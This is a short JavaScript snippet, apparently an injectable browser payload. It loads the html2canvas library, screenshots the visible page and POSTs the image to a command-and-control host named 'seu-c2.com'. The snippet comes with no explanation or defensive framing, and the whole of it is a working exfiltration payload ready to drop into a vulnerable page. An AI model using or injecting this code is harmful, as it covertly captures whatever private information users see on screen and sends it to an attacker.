(function(){
    var C2="https://seu-c2.com/screen";
    var s = document.createElement("script");
    s.src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
    s.onload = function(){
      html2canvas(document.body).then(canvas=>{
        canvas.toBlob(b=>{
          var fd = new FormData();
          fd.append("shot", b, "s.png");
          fetch(C2, {method:"POST", body: fd});
        });
      });
    };
    document.head.appendChild(s);
  })();